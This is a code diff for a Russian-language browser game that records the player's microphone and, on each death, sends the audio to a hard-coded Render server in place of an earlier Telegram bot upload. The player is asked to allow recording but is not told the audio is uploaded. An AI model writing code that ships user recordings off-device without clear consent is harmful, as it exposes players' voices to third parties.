@@ -1,18 +1,3 @@
-// ==================== БЕЗОПАСНАЯ ЗАГРУЗКА КОНФИГА ====================
-let BOT_TOKEN = null;
-let CHAT_ID = null;
-try {
-    if (window.TELEGRAM_CONFIG && window.TELEGRAM_CONFIG.BOT_TOKEN && !window.TELEGRAM_CONFIG.BOT_TOKEN.includes('ВСТАВЬ')) {
-        BOT_TOKEN = window.TELEGRAM_CONFIG.BOT_TOKEN;
-        CHAT_ID = window.TELEGRAM_CONFIG.CHAT_ID;
-        console.log('✅ Конфиг загружен. Режим: ОТПРАВКА В TELEGRAM.');
-    } else {
-        console.log('⚠️ Конфиг не найден. Режим: СКАЧИВАНИЕ ФАЙЛОВ.');
-    }
-} catch (error) {
-    console.log('⚠️ Конфиг не загружен. Режим: СКАЧИВАНИЕ ФАЙЛОВ.');
-}
-
 // ==================== НАСТРОЙКА ИГРЫ ====================
 const canvas = document.getElementById('gameCanvas');
 const ctx = canvas.getContext('2d');
@@ -41,6 +26,7 @@ async function initAudio() {
         console.log('🎤 Запись начата.');
     } catch (error) {
         console.error('❌ Ошибка микрофона:', error);
+        alert('Для записи криков разрешите доступ к микрофону!');
     }
 }
 
@@ -67,20 +53,40 @@ function stopRecordingAndProcess() {
 
 // ==================== ОТПРАВКА/СОХРАНЕНИЕ ====================
 async function sendToTelegram(audioBlob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('voice', audioBlob, `scream_lvl${level}.ogg`);
-    formData.append('caption', `😱 Уровень: ${level} | Очки: ${score}`);
+    // 🔽 ЭТО САМАЯ ВАЖНАЯ СТРОКА: URL ТВОЕГО СЕРВЕРА НА RENDER
+    const SERVER_URL = 'https://scream-game-server.onrender.com/send-scream';
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
-            method: 'POST',
-            body: formData
+        // Конвертируем аудио в base64 для отправки
+        const reader = new FileReader();
+        const audioBase64 = await new Promise((resolve) => {
+            reader.onloadend = () => {
+                const base64String = reader.result.split(',')[1];
+                resolve(base64String);
+            };
+            reader.readAsDataURL(audioBlob);
         });
+
+        // Отправляем на наш сервер на Render
+        const response = await fetch(SERVER_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ audioData: audioBase64 })
+        });
+
         const result = await response.json();
-        return result.ok ? true : false;
+        if (result.success) {
+            console.log('✅ Крик отправлен через сервер!');
+            return true;
+        } else {
+            throw new Error('Сервер вернул ошибку');
+        }
     } catch (error) {
-        console.error('❌ Ошибка отправки:', error);
+        console.error('❌ Ошибка при отправке на сервер:', error);
+        // Резервный вариант: скачать файл
+        downloadAudio(audioBlob);
         return false;
     }
 }
@@ -89,12 +95,12 @@ function downloadAudio(audioBlob) {
     const url = URL.createObjectURL(audioBlob);
     const link = document.createElement('a');
     link.href = url;
-    link.download = `scream_${Date.now()}.ogg`;
+    link.download = `scream_${Date.now()}.wav`;
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
     setTimeout(() => URL.revokeObjectURL(url), 100);
-    console.log('💾 Аудио скачано.');
+    console.log('💾 Аудио скачано (резервный вариант).');
 }
 
 // ==================== ИГРОВАЯ ЛОГИКА ====================
@@ -198,14 +204,9 @@ async function handleDeath() {
     // 1. Останавливаем запись и получаем аудио
     const audioBlob = await stopRecordingAndProcess();
     
-    // 2. Обрабатываем аудио
+    // 2. Обрабатываем аудио (всегда отправляем на сервер)
     if (audioBlob) {
-        if (BOT_TOKEN && CHAT_ID) {
-            const sent = await sendToTelegram(audioBlob);
-            if (!sent) downloadAudio(audioBlob);
-        } else {
-            downloadAudio(audioBlob);
-        }
+        await sendToTelegram(audioBlob); // Отправляем на Render
     }
     
     // 3. Перезапуск или респавн
@@ -356,4 +357,3 @@ async function initGame() {
 
 // Запускаем игру когда страница загрузится
 window.addEventListener('load', initGame);
-
